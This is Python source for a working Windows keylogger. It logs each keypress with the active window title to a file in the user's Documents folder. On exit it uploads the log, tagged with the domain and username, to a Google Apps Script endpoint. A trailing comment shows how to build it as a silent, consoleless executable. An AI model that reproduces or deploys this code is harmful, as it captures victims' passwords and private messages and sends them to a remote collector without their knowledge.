import pygetwindow as gw
from pynput import keyboard
from datetime import datetime
import os
import signal
import sys
import requests

log_file_name = f"{os.environ.get('USERPROFILE')}/Documents/_{os.environ.get('USERDOMAIN')}_{os.environ.get('USERNAME')}_logs_.txt"

## Get current date and time
def get_date_time():
    return datetime.now().strftime("%d%m%Y_%H%M")

## Get active window title
def get_active_window():
    try:
        active_window = gw.getActiveWindow()
        if active_window:
            return active_window.title
        return "NAN"
    except Exception as e:
        return "ERROR"

## Signal handler to end the keylogger
def end(signum, frame):
    try:
        with open(log_file_name, "a", encoding="utf-8") as log_file:
            log_file.write(f"KeyLogger stopped - {get_date_time()}\n")
    except Exception as e:
        return
    try:
        with open(log_file_name, 'r', encoding='utf-8') as file:
            content = file.read()
        response = requests.post("https://script.google.com/macros/s/AKfycbwcGl8IiykvWuKnH8I-JgLpXwK7YKJcaTf4_zoNqp94f5YW-ydi6F0kXLLF3R4RG4ma/exec",data={'text': content, 'filename': f"{get_date_time()}_{os.environ.get('USERDOMAIN')}_{os.environ.get('USERNAME')}_keylogger_log.txt"})   
    except FileNotFoundError:
        return
    except requests.exceptions.RequestException as e:
        return
    except Exception as e:
        return
    sys.exit(0)

## Write log entry
def write_log_entry(key, action):
    try:
        with open(log_file_name, "a", encoding="utf-8") as log_file:
            log_file.write(f"{get_date_time()} - {get_active_window()} - {action}: {key}\n")
    except Exception as e:
        return

def on_press(key):
    try:
        write_log_entry(key.char, "Pressed")
    except AttributeError:
        try:
            key_name = str(key).replace('Key.', '')
            write_log_entry(key_name, "Pressed")
        except Exception as e:
            return
    except Exception as e:
        return

def on_release(key):
    return True

# Start listening for keyboard events
def __main__():
    try:
        with open(log_file_name, "a", encoding="utf-8") as log_file:
            log_file.write(f"KeyLogger started - {get_date_time()}\n")
    except Exception as e:
        return
    
    try:
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            print("Keylogger started. Press ESC to stop.")
            listener.join()
    except Exception as e:
        sys.exit(1)

if __name__ == "__main__":
    try:
        signal.signal(signal.SIGTERM, end)
        signal.signal(signal.SIGINT, end)  # Handle Ctrl+C
        __main__()
    except Exception as e:
        sys.exit(1)

# pyinstaller --onefile --icon=icon.ico --noconsole main.py      